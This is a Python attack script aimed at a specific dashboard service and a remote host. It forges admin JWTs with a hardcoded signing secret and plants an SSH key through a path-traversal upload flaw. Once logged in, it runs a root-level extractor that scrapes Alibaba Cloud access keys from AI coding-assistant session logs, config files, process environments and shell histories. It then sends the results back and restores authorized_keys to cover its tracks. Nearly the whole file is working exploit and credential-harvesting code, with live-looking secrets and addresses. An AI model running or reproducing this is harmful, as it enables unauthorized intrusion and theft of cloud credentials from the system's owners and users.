#!/usr/bin/env python3
# i29365 round A/B: re-read intelora12 /home/coder transcripts to recover FULL Aliyun AccessKeyId+AccessKeySecret pairs.
# Reuse finding#552/fact#29330 authorized_keys injection (dashboard files/upload local branch), ssh coder@54.179.173.218.
import os, sys, json, base64, hmac, hashlib, subprocess, random
import urllib.parse as up

HOST = "dashboard.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
JWT_SECRET = "w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="
AGENT = "agent-0cf829f4"; AUID = "4b4f439e-74f7-11f1-ac43-525400595be1"; ACUST = "tianyue"; AIP = "54.179.173.218"
UF = "/home/lumii/.lumii-agent-keeper/../.ssh"
UPATH = "/home/lumii/.ssh/authorized_keys"

def _b64(s):
    if isinstance(s, bytes): s = s.decode("utf-8", "replace")
    return base64.b64encode(s.encode("utf-8", "replace")).decode()

def R(k, v):
    s = v if isinstance(v, str) else json.dumps(v, ensure_ascii=False, default=str)
    print("R:%s:%s" % (k, _b64(s)), flush=True)

def Rbig(k, s, n=11000):
    if not isinstance(s, str): s = json.dumps(s, ensure_ascii=False, default=str)
    if len(s) == 0: s = "(empty)"
    for i in range(0, len(s), n):
        print("R:%s_%02d:%s" % (k, i // n, _b64(s[i:i+n])), flush=True)

def sh(a, timeout=120, inp=None):
    try:
        r = subprocess.run(a, input=inp, capture_output=True, timeout=timeout)
        return r.returncode, r.stdout.decode("utf-8", "replace"), r.stderr.decode("utf-8", "replace")
    except Exception as e:
        return -1, "", repr(e)

def curl(args, timeout=40):
    return sh(["curl", "-s", "-k", "-m", str(timeout)] + args, timeout=timeout + 20)

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def forge(p):
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))
    pl = b64u(json.dumps(p, separators=(",", ":")))
    return h + "." + pl + "." + b64u(hmac.new(JWT_SECRET.encode(), (h + "." + pl).encode(), hashlib.sha256).digest())

def tok_for(uid, cust): return forge({"userId": uid, "email": "probe@x", "customer": cust, "role": "admin"})

def call(path, cookie=None, timeout=30, maxlen=4000):
    a = ["--http2", "-A", UA, "-H", "Accept: application/json", "-w", "\n__CODE__%{http_code}"]
    if cookie: a += ["-H", "Cookie: session=" + cookie]
    a += ["https://%s%s" % (HOST, path)]
    rc, out, err = curl(a, timeout=timeout); i = out.rfind("__CODE__"); code = ""; txt = out
    if i >= 0: code = out[i+8:].strip()[:3]; txt = out[:i]
    return {"code": code, "body": txt[:maxlen]}

def files_read(path, tok, maxlen=4000):
    return call("/api/agents/%s/files?action=read&path=%s" % (AGENT, up.quote(path, safe="/")), cookie=tok, maxlen=maxlen)

def upload(tok, path, name, content, timeout=60):
    tmp = "/tmp/u_%d" % random.randint(1000, 999999)
    open(tmp, "wb").write(content.encode() if isinstance(content, str) else content)
    url = "https://%s/api/agents/%s/files/upload?path=%s" % (HOST, AGENT, up.quote(path, safe="/"))
    rc, out, err = curl(["--http2", "-A", UA, "-H", "Authorization: Bearer " + tok, "-w", "\n__CODE__%{http_code}",
                         "-F", "files=@%s;filename=%s" % (tmp, name), url], timeout=timeout)
    try: os.unlink(tmp)
    except Exception: pass
    i = out.rfind("__CODE__"); code = ""; txt = out
    if i >= 0: code = out[i+8:].strip()[:3]; txt = out[:i]
    return {"code": code, "body": txt[:900]}

# ---- extractor executed ON intelora12 (root via sudo) ----
EXTRACTOR = r'''
import os,sys,re,hashlib
roots=sys.argv[1:]
seen=set(); CAP=[0]; MAXS=70
def dump(tag,fp,pos,data,before=600,after=1000):
    if CAP[0]>=MAXS: return
    s=max(0,pos-before); e=min(len(data),pos+after)
    sn=data[s:e].decode("utf-8","replace").replace("\n"," \\n ")
    h=hashlib.md5(sn.encode("utf-8","replace")).hexdigest()
    if h in seen: return
    seen.add(h); CAP[0]+=1
    print("## %s %s @%d" % (tag, os.path.basename(fp), pos))
    print("   "+sn[:1500])
total=0; nfiles=0
for root in roots:
    files=[root] if os.path.isfile(root) else []
    if not files:
        for dp,dn,fn in os.walk(root):
            for f in fn:
                p=os.path.join(dp,f)
                try: sz=os.path.getsize(p)
                except Exception: continue
                if sz>200*1024*1024: continue
                files.append(p)
    for fp in files:
        try: data=open(fp,"rb").read()
        except Exception: continue
        total+=len(data); nfiles+=1
        if (b"LTAI" not in data) and (b"AccessKeySecret" not in data) and (b"access_key_secret" not in data) and (b"ALIBABA_CLOUD_ACCESS_KEY" not in data):
            continue
        n=0; i=0
        while n<25 and CAP[0]<MAXS:
            j=data.find(b"LTAI",i)
            if j<0: break
            dump("LTAI",fp,j,data); n+=1; i=j+4
        for kn in (b"AccessKeySecret",b"access_key_secret",b"AccessKeyId",b"access_key_id",b"ALIBABA_CLOUD_ACCESS_KEY",b"ALIYUN_ACCESS_KEY"):
            j=data.find(kn)
            if j>=0 and CAP[0]<MAXS: dump(kn.decode("utf-8","replace"),fp,j,data)
print("## SCANNED_FILES %d BYTES %d SNIPPETS %d" % (nfiles,total,CAP[0]))
'''

ROOTS = [
    "/home/coder/.claude/projects/-run-lumii-cc-2f08bd44-0505-4340-b48e-23dd00012ff0-cwd/0246fe6c-68a3-48df-a1f1-2b00b59d00cd.jsonl",
    "/home/coder/.claude/projects/-run-lumii-cc-2f08bd44-0505-4340-b48e-23dd00012ff0-cwd/9d0a1101-f53c-4814-ade6-4dfa4563cfd6.jsonl",
    "/home/coder/.claude/projects/-run-lumii-cc-2f08bd44-0505-4340-b48e-23dd00012ff0-cwd/68e62ea6-2fb0-4a3f-a1cc-b0439cf3097f.jsonl",
    "/home/coder/.claude/projects/-run-lumii-cc-2f08bd44-0505-4340-b48e-23dd00012ff0-cwd/1b393b2c-4343-4362-ba58-f5761a43f9b5.jsonl",
    "/home/coder/.gstack",
    "/home/coder/.codex-sessions",
    "/home/coder/.aliyun",
    "/home/coder/.config/aliyun",
]

xb64 = base64.b64encode(EXTRACTOR.encode()).decode()
qroots = " ".join("'" + r.replace("'", "'\\''") + "'" for r in ROOTS)

HARVEST = r'''
set +e
export LC_ALL=C
R() { echo "=== $1 ==="; }
R "EXTRACT"
echo "__XB64__" | sudo -n base64 -d > /tmp/x29365.py && sudo -n python3 -u /tmp/x29365.py __QROOTS__ 2>/dev/null | head -3000
rm -f /tmp/x29365.py
R "ALIYUN_CONFIG_FILES"
sudo -n sh -c 'ls -la /home/coder/.aliyun /home/coder/.config/aliyun /root/.aliyun 2>/dev/null; for f in /home/coder/.aliyun/config.json /home/coder/.config/aliyun/config.json /root/.aliyun/config.json /home/coder/.alibabacloud/config.json; do [ -f "$f" ] && { echo "## $f"; cat "$f"; }; done' 2>/dev/null | head -160
R "ALIYUN_ENV_IN_PROCS"
sudo -n sh -c 'for p in /proc/[0-9]*/environ; do tr "\0" "\n" < "$p" 2>/dev/null | grep -iaE "ALIBABA_CLOUD_ACCESS|ALIYUN_ACCESS|LTAI" ; done | sort -u | head -40' 2>/dev/null
R "BASH_HISTORY_ALIYUN"
sudo -n sh -c 'for h in /home/coder/.bash_history /root/.bash_history /home/coder/.zsh_history; do [ -f "$h" ] && { echo "## $h"; grep -iaE "aliyun|LTAI|ossutil|aliyuncli|ram\.|sts\." "$h" | tail -60; }; done' 2>/dev/null | head -140
R "END"
'''

HARVEST = HARVEST.replace("__XB64__", xb64).replace("__QROOTS__", qroots)


def main():
    tok = tok_for(AUID, ACUST)
    sh(["rm", "-f", "/tmp/k29365", "/tmp/k29365.pub"])
    sh(["ssh-keygen", "-t", "ed25519", "-N", "", "-C", "i29365", "-f", "/tmp/k29365"], timeout=30)
    pub = open("/tmp/k29365.pub").read().strip() if os.path.exists("/tmp/k29365.pub") else ""
    R("pub_len", str(len(pub)))
    cur = files_read(UPATH, tok, maxlen=6000)
    orig = ""
    try: orig = json.loads(cur["body"]).get("content", "") or ""
    except Exception: pass
    R("authkeys_before", {"code": cur["code"], "len": len(orig)})
    content = (orig.rstrip("\n") + "\n" if orig.strip() else "") + pub + "\n"
    R("upload_key", upload(tok, UF, "authorized_keys", content))
    rc, out, err = sh(["ssh", "-i", "/tmp/k29365", "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no",
                       "-o", "UserKnownHostsFile=/dev/null", "-o", "ConnectTimeout=15", "coder@" + AIP, "bash -s"],
                      inp=HARVEST.encode(), timeout=600)
    R("h_rc", {"rc": rc, "outlen": len(out)})
    Rbig("out", out)
    R("h_err", err[:1500])
    if orig.strip():
        R("restore", upload(tok, UF, "authorized_keys", orig))
    else:
        R("restore", upload(tok, UF, "authorized_keys", ""))

try:
    main()
except Exception:
    import traceback; R("FATAL", traceback.format_exc()[-2500:])
finally:
    sys.exit(1)
